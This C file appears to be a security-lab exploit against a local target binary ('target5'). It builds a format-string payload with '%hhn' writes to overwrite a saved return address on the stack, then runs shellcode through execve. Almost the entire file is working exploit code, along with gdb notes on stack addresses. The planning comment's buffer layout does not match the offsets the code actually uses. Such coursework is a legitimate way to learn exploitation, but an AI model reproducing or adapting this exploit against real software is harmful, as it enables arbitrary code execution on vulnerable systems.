#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define NOP '\x90'

/*
(gdb) info frame
Stack level 0, frame at 0x3021feb0:
 rip = 0x400b85 in foo (target5.c:15); saved rip = 0x400da0
 called by frame at 0x3021fed0
 source language c.
 Arglist at 0x3021fea0, args: arg=0x7fffffffd843 "test"
 Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
 Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8
(gdb) p & buf
$1 = (char (*)[1024]) 0x3021faa0
(gdb) p & formatString
$2 = (char (*)[256]) 0x3021f9a0

the address that store the return address:
0x3021fea8
0x3021fea9
0x3021feaa
0x3021feab

add dummy val 01010101 as padding

shellcode starts at 0x3021f9a0 + 0d200 = 0x3021fa68

0x30: 48
0x21: 33
0xfa: 250
0x68: 104

0-44 shellcode
45 - 167 junk code
168-171 len overwrite keep the same value
172-175 i overwrite for 150 so that the loop could iterate for 189 times 
184-187 new return addreess(adddress of buffer)
188 End of String
*/

int main(void)
{
  char *args[3];
  // char *env[16];
  char *env[16];
  int attacking_buffer_size = 257;
  char return_addr_1[]="\xa8\xfe\x21\x30\x0\x0\x0\x0";
  char return_addr_2[]="\xa9\xfe\x21\x30\x0\x0\x0\x0";
  char return_addr_3[]="\xaa\xfe\x21\x30\x0\x0\x0\x0";
  char return_addr_4[]="\xab\xfe\x21\x30\x0\x0\x0\x0";
  char dummy_val[]="\x1\x1\x1\x1\x1\x1\x1\x1";  


  char attacking_buffer[attacking_buffer_size];

  memset(attacking_buffer , NOP, attacking_buffer_size);

  memcpy(attacking_buffer, return_addr_1, 8);
  memcpy(attacking_buffer+8, dummy_val, 8);
  memcpy(attacking_buffer+16, return_addr_2, 8);
  memcpy(attacking_buffer+24, dummy_val, 8);
  memcpy(attacking_buffer+32, return_addr_3, 8);
  memcpy(attacking_buffer+40, dummy_val, 8);
  memcpy(attacking_buffer+48, return_addr_4, 8);

  char format_string[] = "%64x%64x%64x%64x%104x%hhn%146x%hhn%39x%hhn%15x%hhn";
  memcpy(attacking_buffer+60, format_string, sizeof(format_string)-1);
	
  memcpy(attacking_buffer+200, shellcode, sizeof(shellcode) - 1);

  attacking_buffer[attacking_buffer_size-1] = '\0';

  args[0] = TARGET; 
  args[1] = attacking_buffer; 
  args[2] = NULL;



  env[0] =  &attacking_buffer[5];
	env[1] =  &attacking_buffer[6];
	env[2] =  &attacking_buffer[7];
	env[3] =  &attacking_buffer[8];
	env[4] =  &attacking_buffer[21];
	env[5] =  &attacking_buffer[22];
	env[6] =  &attacking_buffer[23];
	env[7] =  &attacking_buffer[24];
	env[8] =  &attacking_buffer[37];
	env[9] =  &attacking_buffer[38];
	env[10] = &attacking_buffer[39];
	env[11] = &attacking_buffer[40];
	env[12] = &attacking_buffer[53];
	env[13] = &attacking_buffer[54];
	env[14] = &attacking_buffer[55];
	env[15] = &attacking_buffer[56];
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
